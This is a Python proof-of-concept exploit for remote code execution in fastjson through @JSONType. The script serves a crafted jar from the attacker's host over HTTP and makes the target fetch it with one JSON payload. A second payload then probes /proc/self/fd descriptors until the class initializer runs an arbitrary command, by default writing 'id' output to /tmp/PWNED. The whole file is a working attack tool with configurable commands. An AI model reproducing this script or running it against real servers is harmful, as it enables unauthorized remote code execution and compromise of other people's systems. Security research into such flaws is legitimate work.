#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fd_probe.py - fastjson @JSONType two-stage FD probe (the modern-fd lane).

Stage 1 (POC1): make the TARGET fetch a crafted jar from this host over HTTP.
                The JDK jar cache keeps the jar open on a file descriptor.
Stage 2 (POC2): probe jar:file:/proc/self/fd/N candidates; when N hits the
                still-open cached jar, the class inside gets defined (its
                internal name matches the fd-URL) and <clinit> runs.

Usage:
    python fd_probe.py <target-url> <local-ip>

      target-url : vulnerable endpoint, e.g. http://192.168.150.128:8080/parse
      local-ip   : THIS host's IP as reachable from the target (dotted),
                   e.g. 192.168.150.1  (converted to integer form for the URL)

Per N in 28..99:
  1. Gen.java crafts POC.class with internal name jar:file:/proc/self/fd/N!/POC,
     packed as jar file "N", served at http://<local-ip>:8000/N
  2. POC1 {"@type":"jar:http:..<ip_dec>:8000.N!.POC","x":1}
  3. POC2 {"@type":"jar:file:.proc.self.fd.N!.POC","x":1}
  4. if POC2 status != 500 -> fd hit, stop.
"""
import argparse
import json
import os
import shutil
import socket
import struct
import subprocess
import sys
import threading
import time
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
BUILD_DIR = os.path.join(HERE, "build")
SERVE_DIR = os.path.join(HERE, "serve")
ASM_JAR = os.path.join(HERE, "asm.jar")
GEN_SRC = os.path.join(HERE, "Gen.java")
POC_CLASS = os.path.join(BUILD_DIR, "POC.class")

HTTP_PORT = 8000
FD_RANGE = range(28, 100)          # 28..99
DEFAULT_CMD = "id >> /tmp/PWNED 2>&1; echo RCE_via_fastjson_JSONType >> /tmp/PWNED"
HEADERS = {"Content-Type": "application/json"}
TIMEOUT = 10


def jdk_tools():
    home = os.environ.get("JAVA_HOME") or r"C:\Program Files\Java\jdk1.8.0_341"
    ext = ".exe" if os.name == "nt" else ""
    tools = [os.path.join(home, "bin", t + ext) for t in ("java", "javac", "jar")]
    if not all(os.path.exists(t) for t in tools):
        sys.exit("[ERR] JDK not found under %r - set JAVA_HOME" % home)
    return tools


def ensure_prereqs(javac):
    if not os.path.exists(ASM_JAR):
        sys.exit("[ERR] asm.jar not found at %s" % ASM_JAR)
    os.makedirs(BUILD_DIR, exist_ok=True)
    os.makedirs(SERVE_DIR, exist_ok=True)
    if not os.path.exists(os.path.join(HERE, "Gen.class")):
        print("[*] compiling Gen.java ...")
        subprocess.run([javac, "-encoding", "UTF-8", "-XDignore.symbol.file",
                        "-cp", ASM_JAR, "-d", HERE, GEN_SRC], check=True)


def gen_jar(java, jar, num, cmd):
    """Craft POC.class (internal name = the fd URL) and pack it as jar 'num'."""
    internal = "jar:file:/proc/self/fd/%d!/POC" % num
    out = os.path.join(SERVE_DIR, str(num))
    subprocess.run([java, "-cp", ASM_JAR + os.pathsep + HERE,
                    "Gen", internal, POC_CLASS, cmd], check=True,
                   stdout=subprocess.DEVNULL)
    subprocess.run([jar, "cf", out, "-C", BUILD_DIR, "POC.class"], check=True)
    return out, internal


def start_server():
    handler = partial(SimpleHTTPRequestHandler, directory=SERVE_DIR)
    httpd = ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    print("[*] HTTP server serving %s on 0.0.0.0:%d" % (SERVE_DIR, HTTP_PORT))
    return httpd


def ip_to_int(ip):
    try:
        return struct.unpack(">I", socket.inet_aton(ip))[0]
    except OSError:
        sys.exit("[ERR] bad dotted IP: %r" % ip)


def post(url, poc):
    return requests.post(url, data=json.dumps(poc), headers=HEADERS, timeout=TIMEOUT)


def clean_artifacts():
    gen_cls = os.path.join(HERE, "Gen.class")
    if os.path.exists(gen_cls):
        os.remove(gen_cls)
    if os.path.isdir(BUILD_DIR):
        shutil.rmtree(BUILD_DIR, ignore_errors=True)
    if os.path.isdir(SERVE_DIR):
        shutil.rmtree(SERVE_DIR, ignore_errors=True)


def main():
    ap = argparse.ArgumentParser(description="fastjson @JSONType FD probe")
    ap.add_argument("target", help="target endpoint, e.g. http://host:8080/parse")
    ap.add_argument("ip", help="this host's IP as reachable from the target")
    ap.add_argument("--cmd", default=DEFAULT_CMD,
                    help="command baked into <clinit> (default: %(default)r)")
    a = ap.parse_args()
    if not a.target.startswith("http"):
        sys.exit("[ERR] target must be a full URL, e.g. http://host:8080/parse")

    ip_dec = ip_to_int(a.ip)
    clean_artifacts()
    java, javac, jar = jdk_tools()
    ensure_prereqs(javac)
    httpd = start_server()

    print("[*] target  = %s" % a.target)
    print("[*] ip_dec  = %d  (%s)" % (ip_dec, a.ip))
    print("[*] cmd     = %s" % a.cmd)
    print("[*] sweeping fd %d..%d, stop when POC2 status != 500"
          % (FD_RANGE.start, FD_RANGE.stop - 1))

    hit = None
    completed = False
    try:
        for num in FD_RANGE:
            out, internal = gen_jar(java, jar, num, a.cmd)
            poc1 = {"@type": "jar:http:..%d:%d.%d!.POC" % (ip_dec, HTTP_PORT, num), "x": 1}
            poc2 = {"@type": "jar:file:.proc.self.fd.%d!.POC" % num, "x": 1}
            try:
                r1 = post(a.target, poc1)
                r2 = post(a.target, poc2)
            except requests.RequestException as e:
                print("\n[ERR] target unreachable: %s" % e)
                break
            mark = ""
            if r2.status_code != 500:
                hit = (num, poc1, poc2, r2)
                mark = "  <-- HIT"
            print("[*] fd %-3d POC1 -> %-4s POC2 -> %-4s%s"
                  % (num, r1.status_code, r2.status_code, mark))
            if hit:
                completed = True
                break
            time.sleep(0.2)   # be gentle with the target
        else:
            completed = True
    except KeyboardInterrupt:
        print("\n[*] interrupted")
    finally:
        httpd.shutdown()

    if hit:
        num, poc1, poc2, r2 = hit
        print("\n[+] SUCCESS - fd %d matched (POC2 status %d)" % (num, r2.status_code))
        print("    POC1: %s" % json.dumps(poc1))
        print("    POC2: %s" % json.dumps(poc2))
        print("    response: %s" % r2.text[:300])
        print("[*] check the target for the marker (default: /tmp/PWNED)")
    else:
        print("\n[-] no fd in %d..%d matched" % (FD_RANGE.start, FD_RANGE.stop - 1))

    if completed:
        clean_artifacts()
        print("[*] cleaned up Gen.class and build/")


if __name__ == "__main__":
    main()
